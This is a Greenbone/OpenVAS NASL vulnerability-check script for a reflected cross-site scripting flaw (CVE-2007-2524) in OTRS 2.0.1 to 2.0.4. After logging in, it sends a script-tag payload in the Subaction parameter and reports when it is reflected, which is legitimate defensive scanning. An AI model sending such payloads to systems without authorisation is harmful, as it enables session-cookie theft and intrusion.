# SPDX-FileCopyrightText: 2013 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:otrs:otrs";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.803934");
  script_version("2025-07-18T05:44:10+0000");
  script_tag(name:"last_modification", value:"2025-07-18 05:44:10 +0000 (Fri, 18 Jul 2025)");
  script_tag(name:"creation_date", value:"2013-09-25 12:47:06 +0530 (Wed, 25 Sep 2013)");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");

  script_cve_id("CVE-2007-2524");

  script_name("OTRS 2.0.1 <= 2.0.4 Subaction XSS Vulnerability");

  script_tag(name:"summary", value:"Open Ticket Request System (OTRS) is prone to a cross-site
  scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Tries to login with provided credentials and sends a crafted
  HTTP GET request to check if it is possible to conduct an XSS attack.");

  script_tag(name:"insight", value:"An error exists in index.pl script which fails to validate
  user-supplied input to Subaction parameter properly.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to steal the
  victim's cookie-based authentication credentials.");

  script_tag(name:"affected", value:"OTRS versions 2.0.1 through 2.0.4.");

  script_tag(name:"solution", value:"Update to version 2.0.5 or later.");

  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://secunia.com/advisories/25205");
  script_xref(name:"URL", value:"http://secunia.com/advisories/25419");
  script_xref(name:"URL", value:"http://secunia.com/advisories/25787");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/23862");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/34164");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_analysis");
  script_family("Web application abuses");
  script_copyright("Copyright (C) 2013 Greenbone AG");
  script_dependencies("logins.nasl", "gb_otrs_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("otrs/http/detected", "http/login");

  exit(0);
}

include("url_func.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

function get_otrs_login_cookie(location, otrsport, otrshost)
{
  url = location + "/index.pl?";
  username = urlencode(str:get_kb_item("http/login"));
  password = urlencode(str:get_kb_item("http/password"));
  payload = "Action=Login&RequestedURL=&Lang=en&TimeOffset=-330&User=" + username + "&Password=" + password;

  req = string("POST ",url," HTTP/1.0\r\n",
               "Host: ",otrshost," \r\n",
               "Content-Type: application/x-www-form-urlencoded\r\n",
               "Referer: http://",otrshost,location,"/index.pl\r\n",
               "Connection: keep-alive\r\n",
               "Content-Length: ", strlen(payload),"\r\n\r\n",
               payload);

  buf = http_keepalive_send_recv(port:otrsport, data:req);
  if(!buf)
    exit(0);

  cookie = eregmatch(pattern:"Set-Cookie: Session=([a-z0-9]+)", string:buf);
  if(!cookie[1])
    exit(0);

  return cookie[1];
}

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!loca = get_app_location(cpe:CPE, port:port))
  exit(0);

if(loca == "/")
  loca = "";

host = http_host_name(port:port);
cookie = get_otrs_login_cookie(location:loca, otrsport:port, otrshost:host);

if(cookie)
{
  url = loca + '/index.pl?Action=AgentTicketMailbox&Subaction="<script>alert(document.cookie)</script>"';
  req = string("GET ", url, " HTTP/1.1\r\n",
               "Host: ", host, " \r\n",
               "Connection: keep-alive\r\n",
               "Cookie: Session=", cookie, "\r\n\r\n");

  res = http_send_recv(port:port, data:req);

  if(ereg(pattern:"^HTTP/1\.[01] 200", string:res) &&
   "<script>alert(document.cookie)</script>" >< res && "Logout" >< res)
  {
    report = http_report_vuln_url(port:port, url:url);
    security_message(port:port, data:report);
    exit(0);
  }
  exit(99);
}

exit(0);
